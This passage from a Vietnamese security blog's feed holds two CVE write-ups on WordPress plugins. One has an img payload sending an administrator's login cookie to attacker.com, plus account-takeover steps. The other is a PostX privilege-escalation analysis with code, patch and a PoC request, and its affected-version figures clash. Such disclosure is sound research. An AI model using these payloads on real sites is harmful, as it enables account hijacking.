href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Đăng nhập bằng tài khoản &lt;strong&gt;Contributor&lt;/strong&gt; và tạo một bài viết mới với nội dung:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&amp;#34;http://attacker.com/[wf_get_cookie key=wordpress_logged_in_md5(your_site_url)]&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Khi quản trị viên truy cập bài viết này, trình duyệt sẽ gửi request tới &lt;code&gt;attacker.com&lt;/code&gt;, kèm theo giá trị cookie được render trong URL. Attacker thu thập cookie từ request đó.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/get_cookie.png&#34; title=&#34;Cookie từ request&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/get_cookie.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;Cookie từ request&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/get_cookie.png&#39; alt=&#34;Cookie&#34; height=&#34;148&#34; width=&#34;1509&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cookie từ request&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Attacker truy cập endpoint &lt;code&gt;/my-account/edit-account/&lt;/code&gt; và thay thế cookie &lt;code&gt;wordpress_logged_in_*&lt;/code&gt; của mình bằng cookie của admin vừa thu được.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Thực hiện thay đổi email tài khoản sang địa chỉ email do attacker kiểm soát.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Sử dụng chức năng &lt;strong&gt;forgot password&lt;/strong&gt; để đặt mật khẩu mới.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Đăng nhập lại hệ thống với quyền &lt;strong&gt;admin&lt;/strong&gt; bằng mật khẩu vừa tạo.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-7654 xuất phát từ shortcode &lt;code&gt;wf_get_cookie&lt;/code&gt; cho phép đọc cookie xác thực mà không kiểm soát quyền, dẫn đến rò rỉ &lt;code&gt;wordpress_logged_in_*&lt;/code&gt; và mở đường cho leo thang đặc quyền. Việc kết hợp shortcode với HTML attribute biến hành vi hiển thị dữ liệu thành kênh exfiltration. Bản vá v3.12.0 đã khắc phục bằng cách chặn các cookie nhạy cảm theo pattern.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Shortcode đọc cookie là thiết kế nguy hiểm.&lt;/li&gt;&#xA;&lt;li&gt;HTML attribute injection có thể dẫn đến rò rỉ dữ liệu xác thực.&lt;/li&gt;&#xA;&lt;li&gt;Contributor vẫn có thể trở thành vector leo thang đặc quyền.&lt;/li&gt;&#xA;&lt;li&gt;Cookie &lt;code&gt;wordpress_logged_in_*&lt;/code&gt; đủ để chiếm quyền gián tiếp.&lt;/li&gt;&#xA;&lt;li&gt;Luôn xác minh thực tế bản vá trong mã nguồn.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/funnel-builder/vulnerability/wordpress-funnelkit-plugin-3-11-0-2-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Funnel Builder by FunnelKit Plugin &amp;lt;= 3.11.0.2 is vulnerable to a medium priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53425 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-05-cve-2025-55707/</link>
      <pubDate>Mon, 05 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-05-cve-2025-55707/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-05-cve-2025-55707/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Gán Quyền Không Chính Xác&lt;/strong&gt; (&lt;strong&gt;Incorrect Privilege Assignment&lt;/strong&gt;) trong &lt;strong&gt;PostX, Inc. PostX PostX-lite&lt;/strong&gt; cho phép &lt;strong&gt;Leo Thang Đặc Quyền&lt;/strong&gt; (&lt;strong&gt;Privilege Escalation&lt;/strong&gt;). Vấn đề này ảnh hưởng đến &lt;strong&gt;PostX&lt;/strong&gt; từ &lt;strong&gt;n/a&lt;/strong&gt; đến &lt;strong&gt;&amp;lt;= 4.1.2&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53425&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53425&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.1.35&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.1.36&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Editor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ultimate-post/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress PostX Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;PostX&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.35&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.36&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký REST API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    &amp;#39;ultp/v1&amp;#39;,&#xA;    &amp;#39;/postx_presets/&amp;#39;,&#xA;    array(&#xA;        array(&#xA;            &amp;#39;methods&amp;#39;  =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39; =&amp;gt; array($this, &amp;#39;postx_presets_callback&amp;#39;),&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;                return current_user_can(&amp;#39;edit_posts&amp;#39;);&#xA;            },&#xA;            &amp;#39;args&amp;#39; =&amp;gt; array()&#xA;        )&#xA;    )&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Với cấu hình trên, API được expose dưới dạng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/ultp/v1/postx_presets/&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi có request gửi đến endpoint này với method POST, WordPress sẽ gọi &lt;code&gt;postx_presets_callback()&lt;/code&gt;. Tuy nhiên, trước khi hàm này được thực thi, request bắt buộc phải vượt qua bước kiểm tra quyền thông qua &lt;code&gt;current_user_can(&#39;edit_posts&#39;)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Quyền &lt;code&gt;edit_posts&lt;/code&gt; được cấp cho người dùng có role &lt;strong&gt;Contributor&lt;/strong&gt; trở lên. Trong khi đó, lỗ hổng được công bố lại yêu cầu quyền &lt;strong&gt;Editor&lt;/strong&gt;. Do sự khác biệt này, cần tiếp tục phân tích nội dung của hàm &lt;code&gt;postx_presets_callback()&lt;/code&gt; để xác định nguyên nhân và cách lỗ hổng có thể bị khai thác.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function postx_presets_callback($server) {&#xA;    $post = $server-&amp;gt;get_params();&#xA;    $type = isset($post[&amp;#39;type&amp;#39;]) ? $post[&amp;#39;type&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $key = isset($post[&amp;#39;key&amp;#39;]) ? $post[&amp;#39;key&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $data = isset($post[&amp;#39;data&amp;#39;]) ? $post[&amp;#39;data&amp;#39;] : &amp;#39;&amp;#39;;&#xA;&#xA;    if ( $type ) {&#xA;        if ( $type == &amp;#39;set&amp;#39; ) {&#xA;            if ( current_user_can(&amp;#39;edit_others_posts&amp;#39;) ) {&#xA;                update_option($key, $data);&#xA;            }&#xA;            return [&amp;#39;success&amp;#39; =&amp;gt; true];&#xA;        } else {&#xA;            return [&amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;data&amp;#39; =&amp;gt; get_option($key, [])];&#xA;        }&#xA;    } else {&#xA;        return [&amp;#39;success&amp;#39; =&amp;gt; false];&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm callback lấy các tham số &lt;code&gt;type&lt;/code&gt;, &lt;code&gt;key&lt;/code&gt; và &lt;code&gt;data&lt;/code&gt; từ request. Khi &lt;code&gt;type&lt;/code&gt; bằng &lt;code&gt;&#39;set&#39;&lt;/code&gt;, hàm sẽ gọi &lt;code&gt;update_option()&lt;/code&gt; để cập nhật option tương ứng với &lt;code&gt;$key&lt;/code&gt;, với điều kiện người dùng có quyền &lt;code&gt;edit_others_posts&lt;/code&gt; (chỉ dành cho role &lt;strong&gt;Editor&lt;/strong&gt; trở lên). Trong các trường hợp còn lại, hàm trả về giá trị của option thông qua &lt;code&gt;get_option()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Như vậy, có thể thấy rõ lý do lỗ hổng được công bố với yêu cầu quyền &lt;strong&gt;Editor&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Một kịch bản phổ biến để khai thác lỗ hổng &lt;strong&gt;Privilege Escalation&lt;/strong&gt; thông qua hàm &lt;code&gt;update_option()&lt;/code&gt; là:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Đặt &lt;code&gt;users_can_register = 1&lt;/code&gt; để cho phép người dùng tự đăng ký&lt;/li&gt;&#xA;&lt;li&gt;Đặt &lt;code&gt;default_role = administrator&lt;/code&gt; để các tài khoản mới được tạo có quyền Administrator&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tuy nhiên, do đây là một REST API sử dụng phương thức &lt;strong&gt;POST&lt;/strong&gt;, nên khi được gọi từ trình duyệt, request bắt buộc phải kèm theo nonce. Với các REST request có khả năng thay đổi dữ liệu (POST / PUT / DELETE), WordPress yêu cầu nonce để chống tấn công CSRF. Nếu request không có nonce, WordPress sẽ từ chối với lỗi &lt;code&gt;rest_forbidden&lt;/code&gt;; nếu nonce không hợp lệ, request sẽ bị chặn với lỗi &lt;code&gt;rest_cookie_invalid_nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Để lấy được REST API nonce, ta cần đăng nhập vào Admin Dashboard và gọi &lt;code&gt;wpApiSettings.nonce&lt;/code&gt; trong &lt;strong&gt;browser console&lt;/strong&gt; khi tạo post, vì nonce này chỉ được WordPress inject vào trang khi người dùng đã đăng nhập hợp lệ. Đây là trường hợp đặc biệt, nó được inject vào trang khi tạo post.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá &lt;strong&gt;v4.1.36&lt;/strong&gt; đã siết chặt kiểm soát quyền bằng cách thay đổi &lt;code&gt;permission_callback&lt;/code&gt; như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;    return current_user_can(&amp;#39;manage_options&amp;#39;); // Admins only&#xA;},&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Với thay đổi này, chỉ người dùng có quyền &lt;code&gt;manage_options&lt;/code&gt; (role &lt;strong&gt;Administrator&lt;/strong&gt;) mới có thể truy cập endpoint, qua đó ngăn chặn khả năng khai thác lỗ hổng &lt;strong&gt;Privilege Escalation&lt;/strong&gt; từ các role thấp hơn.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Editor (Authenticated User)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access Admin / Create Post Page&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;WordPress injects wpApiSettings.nonce&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Editor obtains REST API nonce&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;POST /wp-json/ultp/v1/postx_presets/&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;X-WP-Nonce validation&amp;#34;]&#xA;&#xA;F -- Invalid --&amp;gt; G[&amp;#34;Request rejected&amp;#34;]&#xA;F -- Valid --&amp;gt; H[&amp;#34;permission_callback: current_user_can(&amp;#39;edit_posts&amp;#39;)&amp;#34;]&#xA;&#xA;H -- No --&amp;gt; I[&amp;#34;Access denied&amp;#34;]&#xA;H -- Yes --&amp;gt; J[&amp;#34;postx_presets_callback()&amp;#34;]&#xA;&#xA;J --&amp;gt; K{&amp;#34;type == &amp;#39;set&amp;#39;?&amp;#34;}&#xA;K -- No --&amp;gt; L[&amp;#34;get_option()&amp;#34;]&#xA;K -- Yes --&amp;gt; M{&amp;#34;current_user_can(&amp;#39;edit_others_posts&amp;#39;)?&amp;#34;}&#xA;&#xA;M -- No --&amp;gt; N[&amp;#34;Return success without update&amp;#34;]&#xA;M -- Yes --&amp;gt; O[&amp;#34;update_option(key, data)&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Modify sensitive wp_options&amp;#34;]&#xA;P --&amp;gt; Q[&amp;#34;Privilege escalation via default_role / users_can_register&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Dùng Editor account để tạo post&lt;/li&gt;&#xA;&lt;li&gt;Gọi &lt;code&gt;wpApiSettings.nonce&lt;/code&gt; trong &lt;strong&gt;browser console&lt;/strong&gt; để lấy nonce&lt;/li&gt;&#xA;&lt;li&gt;Gửi request với nonce vừa lấy:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Request 1&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/ultp/v1/postx_presets/ HTTP/1.1&#xA;Host: localhost&#xA;Cookie: editor_cookie &#xA;X-WP-Nonce: valid_nonce&#xA;&#xA;type=set&amp;amp;key=users_can_register&amp;amp;data=1&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Request 